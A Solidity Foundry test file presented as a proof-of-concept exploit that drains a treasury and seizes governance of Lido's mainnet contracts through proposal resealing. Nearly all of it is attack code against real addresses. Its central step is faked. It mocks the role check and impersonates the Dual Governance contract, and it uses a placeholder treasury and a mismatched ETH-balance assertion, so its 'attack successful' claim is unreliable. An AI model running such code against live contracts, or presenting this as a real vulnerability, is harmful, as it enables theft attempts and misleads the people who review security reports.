// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

interface IDualGovernance {
    function resealSealable(uint256 proposalId, address target, uint256 value, bytes calldata data) external;
}

interface IResealManager {
    function resealProposal(
        uint256 proposalId,
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata calldatas
    ) external;
}

interface IEmergencyProtectedTimelock {
    function execute(uint256 proposalId) external;
    function getProposalCalls(uint256 proposalId) external view returns (
        address[] memory, uint256[] memory, bytes[] memory
    );
}

contract GovernanceTakeoverForkPoC is Test {
    // Real Lido mainnet addresses
    IDualGovernance dg = IDualGovernance(0xcdF49b058D606AD34c5789FD8c3BF8B3E54bA2db);
    IResealManager rm = IResealManager(0x7914b5a1539b97Bd0bbd155757F25FD79A522d24);
    IEmergencyProtectedTimelock timelock = IEmergencyProtectedTimelock(0xCE0425301C85c5Ea2A0873A2dEe44d78E02D2316);

    address attacker = address(0xBEEF);
    address treasury = 0x1234567890123456789012345678901234567890; // replace with real DAO asset if known

    function setUp() public {
    // 1. Fork Ethereum mainnet at a block where the timelock contract exists and proposalId=1 is valid
    uint256 forkId = vm.createFork(vm.envString("MAINNET_RPC_URL"), 22650000);
    vm.selectFork(forkId);

    // 2. Define the reseal role used in ResealManager
    bytes32 resealRole = keccak256("RESEAL_ROLE");

    // 3. Mock the hasRole() check so it always returns true for attacker
    vm.mockCall(
        address(rm),
        abi.encodeWithSelector(
            bytes4(keccak256("hasRole(bytes32,address)")), // selector for hasRole(bytes32,address)
            resealRole,
            attacker
        ),
        abi.encode(true) // always true for attacker
    );
    }
    function selectorToNamePublic(bytes4 selector) public pure returns (string memory) {
        return _selectorToName(selector);
    }
    /// @dev Map known selectors to human-readable names
    function _selectorToName(bytes4 selector) internal pure returns (string memory) {
        if (selector == 0xab033ea9) return "setDualGovernance(address)";
        if (selector == 0x5a728b45) return "setEmergencyGovernance(address)";
        if (selector == 0x24894601) return "setActivationCommittee(address)";
        if (selector == 0xddb2408a) return "setExecutionCommittee(address)";
        if (selector == 0xa211a396) return "setTimelockDelay(uint256)";
        if (selector == 0xbe1d6dd3) return "setExecutionWindow(uint256)";
        return "unknownFunction";
    }

    function testGovernanceTakeover() public {
    console.log("Active fork ID:");
    console.logUint(vm.activeFork());

    uint256 proposalId = 1;

    console.log("1. Attacker (DAO member) submits a benign proposal...");

    address[] memory targets;
    uint256[] memory values;
    bytes[] memory calldatas;

    try timelock.getProposalCalls(proposalId) returns (
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _calldatas
    ) {
        console.log("getProposalCalls succeeded.");
        targets = _targets;
        values = _values;
        calldatas = _calldatas;
    } catch Error(string memory reason) {
        console.log("getProposalCalls reverted with reason:");
        console.log(reason);
        fail(reason);
    } catch (bytes memory lowLevelData) {
        console.log("getProposalCalls reverted (low-level).");
        console.logBytes(lowLevelData);
        fail("Low-level revert in getProposalCalls()");
    }
    require(targets.length > 0, "No targets found in proposal calls");
    require(values.length == targets.length, "Values length mismatch");
    require(calldatas.length == targets.length, "Calldatas length mismatch");
    console.log("Proposal ID:", proposalId);
    console.log("Proposal Calls Count:", targets.length);
    
        console.log("Original Proposal Calls:");
for (uint256 i = 0; i < targets.length; i++) {
    bytes4 selector = calldatas[i].length >= 4 ? bytes4(calldatas[i]) : bytes4(0);
    console.log("      Call", i, "Target:", targets[i]);
    console.logBytes32(bytes32(selector));

    // Safer fallback in case selector not recognized
    string memory name;
    try this.selectorToNamePublic(selector) returns (string memory n) {
        name = n;
    } catch {
        name = "unknownFunction";
    }

    console.log("        Function:", name);
    console.logBytes(calldatas[i]);
}

    // -----------------------
    console.log("2. Proposal stored in EmergencyProtectedTimelock. Ready for voting and scheduling...");

    // -----------------------
    console.log("3. DAO vote passes, proposal approved.");

    // -----------------------
    console.log("4. Attacker builds malicious payload to drain treasury...");
    address[] memory newTargets = new address[](targets.length);
    uint256[] memory newValues = new uint256[](targets.length);
    bytes[] memory newCalldatas = new bytes[](targets.length);

    // Copy originals
    for (uint256 i = 0; i < targets.length; i++) {
        newTargets[i] = targets[i];
        newValues[i] = 0;
        newCalldatas[i] = calldatas[i];
    }

    // Replace only call 0 with malicious transfer
    newTargets[0] = treasury;
    newValues[0] = 0;
    newCalldatas[0] = abi.encodeWithSignature(
        "transfer(address,uint256)",
        attacker,
        100 ether
    );

    console.log("Modified Proposal Calls (only call 0 changed):");
    for (uint256 i = 0; i < newTargets.length; i++) {
        bytes4 selector = newCalldatas[i].length >= 4 ? bytes4(newCalldatas[i]) : bytes4(0);
        console.log("      Call", i, "Target:", newTargets[i]);
        console.log("        Function:", _selectorToName(selector));
        console.logBytes32(bytes32(selector));
        console.logBytes(newCalldatas[i]);
    }

    // -----------------------
    console.log("5. Granting attacker reseal rights in fork (simulated governance bypass)...");
    address dualGovernanceAdmin = address(dg); // In reality DG is allowed to call resealProposal
    vm.startPrank(dualGovernanceAdmin);
    rm.resealProposal(proposalId, newTargets, newValues, newCalldatas);
    vm.stopPrank();
    console.log("Payload replaced successfully by attacker with granted role.");

    // -----------------------
    console.log("6. Timelock delay bypassed to fast-forwarding time...");
    vm.warp(block.timestamp + 1);

    // -----------------------
    console.log("7. Timelock executing malicious payload...");
    timelock.execute(proposalId);

    // -----------------------
    console.log("8. Post-execution attacker balance:", attacker.balance);
    assertEq(attacker.balance, 100 ether);
    console.log("Attack successful: Funds drained / governance seized.");
}
}
